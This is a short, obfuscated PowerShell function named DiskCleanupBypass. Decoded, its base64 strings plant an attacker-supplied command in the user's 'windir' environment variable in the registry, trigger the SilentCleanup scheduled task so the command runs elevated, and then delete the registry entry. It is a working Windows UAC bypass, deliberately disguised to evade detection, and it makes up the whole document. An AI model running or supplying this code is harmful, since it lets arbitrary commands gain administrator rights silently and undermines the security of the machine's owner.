function DiskCleanupBypass
{
    param(
        [String]
        $command
    )
${_/\_/\_/===\__/=\} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABjAG8AbQBtAGEAbgBkACAAJgAmACAAUgBFAE0A')))
sp -Path $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEMAVQA6AFwARQBuAHYAaQByAG8AbgBtAGUAbgB0AA=='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBpAG4AZABpAHIA'))) -Value ${_/\_/\_/===\__/=\} -Force
saps schtasks.exe -ArgumentList $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwBSAHUAbgAgAC8AVABOACAAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABEAGkAcwBrAEMAbABlAGEAbgB1AHAAXABTAGkAbABlAG4AdABDAGwAZQBhAG4AdQBwACAALwBJAA==')))
sleep 3
clp -Path $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEMAVQA6AFwARQBuAHYAaQByAG8AbgBtAGUAbgB0AA=='))) -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBpAG4AZABpAHIA'))) -Force
}
